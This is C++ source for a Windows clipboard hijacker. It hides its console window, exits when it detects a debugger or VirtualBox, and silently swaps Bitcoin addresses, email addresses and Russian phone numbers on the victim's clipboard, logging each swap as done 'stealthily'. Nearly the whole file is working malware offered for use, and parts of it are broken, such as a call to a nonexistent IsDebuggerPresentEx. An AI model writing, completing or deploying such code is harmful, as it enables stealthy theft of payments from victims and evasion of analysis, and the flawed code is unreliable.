#include <windows.h>
#include <iostream>
#include <string>
#include <regex>
#include <thread>
#include <chrono>
#include <vector>
#include <random>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <codecvt>
#include <locale>

// AES key for encryption (replace with your secure key)
unsigned char aesKey[32] = "01234567890123450123456789012345"; // Using a 256-bit key

// Function for AES encryption
std::string EncryptAES(const std::string& text) {
    AES_KEY encryptKey;
    AES_set_encrypt_key(aesKey, 256, &encryptKey);

    std::string encryptedText;
    encryptedText.resize(text.size() + AES_BLOCK_SIZE);

    unsigned char ivec[AES_BLOCK_SIZE] = { 0 };
    int num = 0;
    AES_cfb128_encrypt((const unsigned char*)text.c_str(), (unsigned char*)encryptedText.data(), text.size(), &encryptKey, ivec, &num, AES_ENCRYPT);

    return encryptedText;
}

// Function for AES decryption
std::string DecryptAES(const std::string& encryptedText) {
    AES_KEY decryptKey;
    AES_set_decrypt_key(aesKey, 256, &decryptKey);

    std::string decryptedText;
    decryptedText.resize(encryptedText.size());

    unsigned char ivec[AES_BLOCK_SIZE] = { 0 };
    int num = 0;
    AES_cfb128_encrypt((const unsigned char*)encryptedText.c_str(), (unsigned char*)decryptedText.data(), encryptedText.size(), &decryptKey, ivec, &num, AES_DECRYPT);

    return decryptedText;
}

// Function to check if text matches a given pattern
bool MatchesPattern(const std::wstring& text, const std::wstring& pattern) {
    std::wregex regex(pattern);
    return std::regex_match(text, regex);
}

// Function to replace clipboard content with encrypted text
bool ReplaceClipboard(const std::wstring& newText) {
    if (!OpenClipboard(nullptr)) {
        std::cerr << "Failed to open clipboard" << std::endl;
        return false;
    }

    EmptyClipboard();

    // Encrypt newText using AES
    std::string encryptedText = EncryptAES(std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(newText));

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (encryptedText.length() + 1) * sizeof(char));

    if (hMem == nullptr) {
        CloseClipboard();
        std::cerr << "Failed to allocate memory for clipboard data" << std::endl;
        return false;
    }

    char* clipData = static_cast<char*>(GlobalLock(hMem));

    if (clipData == nullptr) {
        GlobalFree(hMem);
        CloseClipboard();
        std::cerr << "Failed to lock clipboard memory" << std::endl;
        return false;
    }

    strcpy_s(clipData, encryptedText.length() + 1, encryptedText.c_str());

    GlobalUnlock(hMem);

    SetClipboardData(CF_TEXT, hMem);

    CloseClipboard();
    return true;
}

// Function to retrieve clipboard content
std::wstring GetClipboardContent() {
    if (!OpenClipboard(nullptr)) {
        return L"";
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData == nullptr) {
        CloseClipboard();
        return L"";
    }

    wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
    if (pszText == nullptr) {
        CloseClipboard();
        return L"";
    }

    std::wstring clipboardText(pszText);
    GlobalUnlock(hData);
    CloseClipboard();

    return clipboardText;
}

// Function to check if debugger is attached
bool IsDebuggerAttached() {
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    return isDebuggerPresent == TRUE;
}

// Function to check for virtual machine environment
bool IsVirtualMachine() {
    const std::vector<std::string> vmIndicators = {
        "SYSTEM\\ControlSet001\\Services\\Disk\\Enum",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
        "SYSTEM\\ControlSet001\\Services\\VBoxService",
        "SYSTEM\\ControlSet001\\Services\\VBoxSF",
        "SYSTEM\\ControlSet001\\Services\\VBoxVideo",
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "HARDWARE\\ACPI\\RSDT\\VBOX__",
        "HARDWARE\\ACPI\\SSDT\\VBOX__",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
    };

    for (const auto& key : vmIndicators) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    return false;
}

// Function to implement anti-debugging techniques
void AntiDebug() {
    while (true) {
        if (IsDebuggerAttached() || IsVirtualMachine() || IsDebuggerPresent() || IsDebuggerPresentEx(0)) {
            std::cerr << "Debugger or virtual machine detected! Exiting..." << std::endl;
            ExitProcess(1);
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Function to monitor clipboard content and replace as necessary
void MonitorClipboard() {
    std::wstring lastClipboardContent = L"";

    while (true) {
        std::wstring clipboardText = GetClipboardContent();
        

        if (!clipboardText.empty() && clipboardText != lastClipboardContent) {
            if (MatchesPattern(clipboardText, L"^[13][a-zA-Z0-9]{25,34}$")) {
                std::wstring replaceText = L"btc"; // Replace with text for Bitcoin address
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Bitcoin address replaced stealthily!" << std::endl;
                }
            } else if (MatchesPattern(clipboardText, L"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$")) {
                std::wstring replaceText = L"mail"; // Replace with text for email address
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Email address replaced stealthily!" << std::endl;
                }
            } else if (MatchesPattern(clipboardText, L"^\\+7\\d{10}$")) {
                std::wstring replaceText = L"phone"; 
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Russian phone number replaced stealthily!" << std::endl;
                }
            }

            lastClipboardContent = clipboardText;
        }

        std::random_device rd {};
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(500, 2000); // Delay between 500 ms to 2000 ms
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }
}

int main() {
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Start anti-debugging function
    std::thread(AntiDebug).detach();

    // Start clipboard monitoring
    MonitorClipboard();

    return 0;
}
